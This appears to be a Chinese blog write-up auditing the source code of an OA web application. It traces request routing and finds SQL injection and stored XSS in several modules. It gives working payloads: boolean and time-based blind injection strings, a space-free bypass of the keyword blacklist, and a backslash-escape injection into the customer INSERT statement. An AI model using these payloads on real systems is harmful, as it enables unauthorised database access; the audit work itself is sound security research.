---
title: 新律OA代码审计
date: 2024-10-30 20:52:49
tags:
---

# 0.功能测试

从左到右再从上到下测试,通过参数提交，bp抓包定位源码逻辑

![image-20241030205314455](新律OA代码审计/image-20241030205314455.png)

# 路由解析

随便抓个包

![image-20241030214519723](新律OA代码审计/image-20241030214519723.png)

```
a=save&m=mode_user|input&d=flow&ajaxbool=true&rnd=20221
```

index.php

![image-20241030214433021](新律OA代码审计/image-20241030214433021.png)



![image-20241030215102276](新律OA代码审计/image-20241030215102276.png)

```
$clsname	= ''.$m.'ClassAction';  //这里的m = mode_user

$actname	= ''.$a.'Action'; // $a = save
```

成功定位到该类

![image-20241030214830857](新律OA代码审计/image-20241030214830857.png)

添加一行，查看函数名

![image-20241030215831998](新律OA代码审计/image-20241030215831998.png)

此时： actname = saveAjax; $xhrock = mode_userClass

该类是inputAction的子类

![image-20241030223428542](新律OA代码审计/image-20241030223428542.png)

inputaction.php中有saveAjax

![image-20241030223451966](新律OA代码审计/image-20241030223451966.png)

到这里路由解析就完成了，就是debug不好搞，得手动echo查看

# 1.个人办公

## 个人设置

### 1.测试修改密码处的sql注入

![image-20241030205458812](新律OA代码审计/image-20241030205458812.png)

不知道为啥debug不了，全局搜索变量，发现两处

![image-20241030210654808](新律OA代码审计/image-20241030210654808.png)

不能debug也没关系，通过修改源码直接回显变量

逻辑：通过用户id直接查密码，id控不了

![image-20241030210836804](新律OA代码审计/image-20241030210836804.png)

![image-20241030210906749](新律OA代码审计/image-20241030210906749.png)

![image-20241030210859275](新律OA代码审计/image-20241030210859275.png)

```
$this->T('admin'),"`pass`","`id`='$id'" -> select pass from xinhu_admin where id = $id
```

通过控制$id进行sql注入  $id跟新增用户的时候有关

找到新增用户

![image-20241030213911901](新律OA代码审计/image-20241030213911901.png)

发现id可控

![image-20241030214002438](新律OA代码审计/image-20241030214002438.png)

## 2.个人资料编辑-头像上传

传一个正常文件

![image-20241030211226182](新律OA代码审计/image-20241030211226182.png)

名字随机数了,w

## 3.手写签名-文件上传

![image-20241030211648541](新律OA代码审计/image-20241030211648541.png)

后面应该是白名单

![image-20241030211905881](新律OA代码审计/image-20241030211905881.png)

![image-20241030211831862](新律OA代码审计/image-20241030211831862.png)

![image-20241030212804246](新律OA代码审计/image-20241030212804246.png)

## 4.新增用户处sql测试

![image-20241030223342180](新律OA代码审计/image-20241030223342180.png)

找到 39行查询用户名并判断用户名是否存在。 可以进行sql注入

![image-20241030220931317](新律OA代码审计/image-20241030220931317.png)

看了下官方文档

![image-20241030221155787](新律OA代码审计/image-20241030221155787.png)

![image-20241030221653503](新律OA代码审计/image-20241030221653503.png)

```
user=' or if(1=1,sleep(5),1) --&
```

![image-20241030222531237](新律OA代码审计/image-20241030222531237.png)

引号被编码了

直接在代码里修改判断是否存在sql注入

最开始的日志

![image-20241030230623337](新律OA代码审计/image-20241030230623337.png)

代码中

![image-20241030230635378](新律OA代码审计/image-20241030230635378.png)

新增了两条报错日志

![image-20241030230651186](新律OA代码审计/image-20241030230651186.png)

将usern的单引号删除后无报错日志

说明确实存在sql注入。

sql注入的利用： 

1.找到完整的sql语句

![image-20241030230929771](新律OA代码审计/image-20241030230929771.png)

```
$user = "asdf1' and if(1=1,1,2)=1-- ";
```

判断是否成功就看有没有报错

当user不存在的时候，会提示手机号存在

![image-20241030231042659](新律OA代码审计/image-20241030231042659.png)

当user存在的时候，会提示<>存在

![image-20241030231127709](新律OA代码审计/image-20241030231127709.png)

利用 

```
where user = 'asdf' and if(1=1,1,2)=2  -> where true and flase ->用户不存在提示手机号存在
和
where user = 'asdf' and if(1=1,1,2)=1  -> where true and true  -> 用户存在提示用户存在
```

进行bool盲注

用户存在示例：

![image-20241030231549969](新律OA代码审计/image-20241030231549969.png)

![image-20241030231601598](新律OA代码审计/image-20241030231601598.png)

用户不存在示例

![image-20241030231624845](新律OA代码审计/image-20241030231624845.png)

![image-20241030231636513](新律OA代码审计/image-20241030231636513.png)

布尔盲注：失败则出现13800000008，成功则无

写脚本爆破

时间盲注payload

```
"asdf' and if(1=1,sleep(3),2)=1 -- aaaa<br>";
```

理论上可以，现在测试从http传参

![image-20241030231858189](新律OA代码审计/image-20241030231858189.png)

参数跟踪:从user_modeclass.php#savebefor往上找

![image-20241030233135390](新律OA代码审计/image-20241030233135390.png)

inputaction#saveAjax

![image-20241030233151395](新律OA代码审计/image-20241030233151395.png)

inputaction#getsavenarr![image-20241030233250402](新律OA代码审计/image-20241030233250402.png)

根据265行, bos本质上就是$nsrr , $nsrr又是上文的$uaarr

找到$uaarr的初始化位置

![image-20241030233752648](新律OA代码审计/image-20241030233752648.png)

![image-20241030233759093](新律OA代码审计/image-20241030233759093.png)

通过修改var_dump($uaarr)的位置查看$uaarr的值可以发现，$uaarr在foreach中赋值了

![image-20241030233808828](新律OA代码审计/image-20241030233808828.png)

![image-20241030233817860](新律OA代码审计/image-20241030233817860.png)

新加两行参数查看

![image-20241030234023990](新律OA代码审计/image-20241030234023990.png)

![image-20241030234043028](新律OA代码审计/image-20241030234043028.png)

fid为key，val为val进行数组赋值

找到val初始化 $val = $this->post($fid); 

![image-20241030234109006](新律OA代码审计/image-20241030234109006.png)

跟进$this->post($fid);

![image-20241030234200537](新律OA代码审计/image-20241030234200537.png)

跟进rock

![image-20241030234229174](新律OA代码审计/image-20241030234229174.png)

发现rock和globals有关，输出globals查看

![image-20241030234242585](新律OA代码审计/image-20241030234242585.png)

rock为 rockClass

![image-20241030234356018](新律OA代码审计/image-20241030234356018.png)

全局搜索定位rockClass

![image-20241030234420587](新律OA代码审计/image-20241030234420587.png)

找到post函数

函数逻辑：1.判断post请求中是否有key,有就直接赋值

2.如果post中没有就从get请求中找

最后调用jmuncode()

![image-20241030234501461](新律OA代码审计/image-20241030234501461.png)

在post函数中echo val进行参数查看

![image-20241030234709818](新律OA代码审计/image-20241030234709818.png)

![image-20241030234648115](新律OA代码审计/image-20241030234648115.png)

如上图，冒号还没编码

jmuncode（）， 如下图 

1.将 ' 替换为 &#39 将%20替换为空格

2.转为小写字符进行黑名单匹配

![image-20241030235027308](新律OA代码审计/image-20241030235027308.png)

黑名单如下：

![image-20241030235113109](新律OA代码审计/image-20241030235113109.png)

该函数逻辑有问题，在检测前和检测后分别输出$s

![image-20241031000248548](新律OA代码审计/image-20241031000248548.png)

用空格隔开，此时能正常替换

![image-20241031000223316](新律OA代码审计/image-20241031000223316.png)

用括号就替换不了

![image-20241031000328361](新律OA代码审计/image-20241031000328361.png)

用双写也识别不了

![image-20241031000421623](新律OA代码审计/image-20241031000421623.png)

重新看了下黑名单

![image-20241031000850269](新律OA代码审计/image-20241031000850269.png)

一共三个黑名单， lvlaras 、lvlaraa、lavarab

上文中用到的是 as黑名单，该黑名单检测 select*,select%20,select空格

但是不检测select这个字符串 ????? 

不知道开发人员是怎么想的

这里可以用 select(*)from(xxx)进行空格绕过

那现在的问题就是引号怎么绕过。。。。。

先把引号过滤删掉接着往下走

可以发现，传参的空格被弄了

![image-20241031001940739](新律OA代码审计/image-20241031001940739.png)

将参数输出发现

![image-20241031002123844](新律OA代码审计/image-20241031002123844.png)

空格是在savebefore里删掉的，如下图

![image-20241031002208122](新律OA代码审计/image-20241031002208122.png)

![image-20241031002246583](新律OA代码审计/image-20241031002246583.png)

堆叠注入

```
select * from xinhu_admin where `user` = 'asdfasdf';select username from ('username','admin')a where username=1;
```

无空格的时间盲注

```
asdfasdf'or(benchmark(10000000,encode("hello","good")))--
```

```
select * from xinhu_admin where `user` = 'asdfasdf'or(benchmark(10000000,encode("hello","good")))--
```

![image-20241031003412566](新律OA代码审计/image-20241031003412566.png)

现在就差引号了

问题转化为

字符类型的SQL注入过滤了引号有办法绕过吗,$user可控

```
select * from user where user='$user' 
```

## 5.通知公告xss

![image-20241031143657457](新律OA代码审计/image-20241031143657457.png)

## 6.日程xss

![image-20241031143725018](新律OA代码审计/image-20241031143725018.png)

## 7.单据提醒xss

![image-20241031143801393](新律OA代码审计/image-20241031143801393.png)

## 8.会议xss

今日会议

![image-20241031143952275](新律OA代码审计/image-20241031143952275.png)

会议室情况xss

![image-20241031144011329](新律OA代码审计/image-20241031144011329.png)

## 9.考勤xss

我的外出记录

![image-20241031144107965](新律OA代码审计/image-20241031144107965.png)

打卡异常

![image-20241031144151812](新律OA代码审计/image-20241031144151812.png)

## 10.日报xss

![image-20241031144258005](新律OA代码审计/image-20241031144258005.png)

# 2.资源

## 1.文件传送 xss

![image-20241031144548923](新律OA代码审计/image-20241031144548923.png)

## 2.知识信息管理xss

![image-20241031144612294](新律OA代码审计/image-20241031144612294.png)

## 3.知识题管理xss

![image-20241031144620232](新律OA代码审计/image-20241031144620232.png)

# 3.任务

![image-20241031144740695](新律OA代码审计/image-20241031144740695.png)

# 4.客户

## 新增客户sql

```
POST /xinlvoa/index.php?a=save&m=mode_customer|input&d=flow&ajaxbool=true&rnd=153292
```

调用mode_customeClassAction 的 saveajax()

saveajax() -> savebefore / saveafter

savebefore上文分析过了

saveafter 也只有一个参数可控

![image-20241031150107275](新律OA代码审计/image-20241031150107275.png)



用户插入的时候是怎么样的语句

![image-20241031155249141](新律OA代码审计/image-20241031155249141.png)

![image-20241031155237943](新律OA代码审计/image-20241031155237943.png)



![image-20241031155809633](新律OA代码审计/image-20241031155809633.png)

结尾添加一句sql进行debug

![image-20241031160015123](新律OA代码审计/image-20241031160015123.png)

![image-20241031155954054](新律OA代码审计/image-20241031155954054.png)



```
insert into `xinhu_customer` set `name`='3',`type`='互联网',`laiyuan`='网上开拓',`unitname`='a2',`tel`='13800000000',`mobile`='1',`email`=null,`sheng`=null,`shi`=null,`address`='1111',`routeline`=null,`shibieid`=null,`openbank`=null,`cardid`=null,`status`='11',`isstat`='0',`isgys`='0',`linkname`='a3',`explain`=null,`optdt`='2024-10-31 16:02:19',`optname`='管理员',`uid`='1',`adddt`='2024-10-31 16:02:19',`createid`='1',`createname`='管理员',`comid`='1'
```

用转义字符过滤, 找两个可控字段：

unitname、linkname

```
insert into `xinhu_customer` set `name`='3',`type`='互联网',`laiyuan`='网上开拓',`unitname`='a2',`tel`='13800000000',`mobile`='1',`email`=null,`sheng`=null,`shi`=null,`address`='1111',`routeline`=null,`shibieid`=null,`openbank`=null,`cardid`=null,`status`='11',`isstat`='0',`isgys`='0',`linkname`='a3',`explain`='1',`optdt`='2024-10-31 16:02:19',`optname`='管理员',`uid`='1',`adddt`='2024-10-31 16:02:19',`createid`='1',`createname`='管理员',`comid`='1'
```



```
`linkname`='a3\',`explain`=';select(benchmark(10000000,to_days(2011-04-07)-to_days(now())<1));#'
```

![image-20241031165132524](新律OA代码审计/image-20241031165132524.png)

linkname=a3\ & explain=;#

![image-20241031165742438](新律OA代码审计/image-20241031165742438.png)

成功注入

![image-20241031165819567](新律OA代码审计/image-20241031165819567.png)

继续构造语句

![image-20241031170741755](新律OA代码审计/image-20241031170741755.png)

![image-20241031170807885](新律OA代码审计/image-20241031170807885.png)

将 1 替换为 时间盲注语句脚本

![image-20241031170859363](新律OA代码审计/image-20241031170859363.png)

最终payload

```
linkname=a3\
explain = ",`explain`=(select(if(1=1,(benchmark(10000000,to_days(2011-04-07)-to_days(now())<1)),2)=1))#"
```

后面的字段不局限于explain，只要是字段linkname后面的都行

```
insert into `xinhu_customer` set `name`='3',`type`='互联网',`laiyuan`='网上开拓',`unitname`='a2',`tel`='13800000000',`mobile`='1',`email`=null,`sheng`=null,`shi`=null,`address`='1111',`routeline`=null,`shibieid`=null,`openbank`=null,`cardid`=null,`status`='11',`isstat`='0',`isgys`='0',`linkname`='a3',`explain`='1',`optdt`='2024-10-31 16:02:19',`optname`='管理员',`uid`='1',`adddt`='2024-10-31 16:02:19',`createid`='1',`createname`='管理员',`comid`='1'
```



# 5.黑盒加白盒的测试

1.黑盒找到测试点，如sql查询、评论、文件上传。

2.通过抓包获取数据包提交的参数名、参数值、提交的后端接口

3.根据后端接口找到代码中的指定位置，打断点进行debug

debug的目的：找到参数处理，如是否有黑白名单过滤，有的话后端怎么处理，该怎么绕过
